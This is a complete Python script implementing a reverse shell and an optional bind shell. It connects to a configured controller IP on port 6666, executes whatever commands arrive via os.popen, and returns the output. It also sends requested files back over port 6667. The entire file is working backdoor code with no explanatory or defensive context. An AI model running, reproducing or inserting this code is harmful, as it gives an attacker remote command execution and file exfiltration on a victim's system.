#!/usr/bin/python
#
# python2.7 and python3
#

import os
import sys
import socket

IP='127.0.0.1'

REVERSE=True

class tcp_socket():

    def listen_on(self, port):
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = ''
        self.s.bind((self.host, int(port)))
        self.s.listen(5)
        self.conn, self.addr = self.s.accept()

    def connect_to(self, host, port):
        self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.conn.connect((host, int(port)))

    def recive_data(self):
        return self.conn.recv(1024)

    def send_data(self, data):
        self.conn.sendall(data)
        
    def send_file(self, filename):
        self.conn.sendall(open(filename, "rb").read())
        self.conn.close()

    def close(self):
        self.conn.close()


def easy_exec(cmd):
    try:
        return os.popen(cmd).read()
    except:
        return "input error"

def easy_chdir(s):
    try:
        os.chdir(s)
    except:
        pass
    
def easy_file_send(filename, IP):
    if REVERSE == True:
        xf = tcp_socket()
        xf.connect_to(IP, 6667)
        xf.send_file(filename)
    else:
        xf = tcp_socket()
        xf.listen_on(6667)
        xf.send_file(filename)

# python2.7 and python3
def to_bytes(s):
    if sys.version_info[0] < 3:
        return bytes(s)
    else:
        return bytes(s, 'utf-8')

# python2.7 and python3
def to_str(s):
    if sys.version_info[0] < 3:
        return str(s)
    else:
        return str(s, 'utf-8')

def easy_cmd(conn):
    conn.send_data(to_bytes('hello from the other side :)\n'))
    while 1:
        conn.send_data(to_bytes(str('[Honigkuchenpferd]:' + os.getcwd() + '# ')))
        cmd = to_str(conn.recive_data())
        if cmd.startswith('cd'):
            easy_chdir(cmd[3:len(cmd) - 1])
        elif cmd.startswith('download'):
            easy_file_send(cmd[9:len(cmd)-1], IP)
        elif cmd == "exit\n":
            conn.close()
            exit()
        else:
            conn.send_data(to_bytes(easy_exec(cmd)))

def reverse_shell(IP, PORT):
    x = tcp_socket()
    x.connect_to(IP, PORT)
    easy_cmd(x)

def bind_shell(PORT):
    x = tcp_socket()
    x.listen_on(PORT)
    easy_cmd(x)

if __name__ == '__main__':
    if REVERSE == True:
        reverse_shell(IP, 6666)
    else:
        bind_shell(6666)
    
'''
    if len(sys.argv) > 3:
        if sys.argv[1] == "-r":
            reverse_shell(sys.argv[2], sys.argv[3])
        if sys.argv[1] == "-b":
            bind_shell(sys.argv[2])
'''



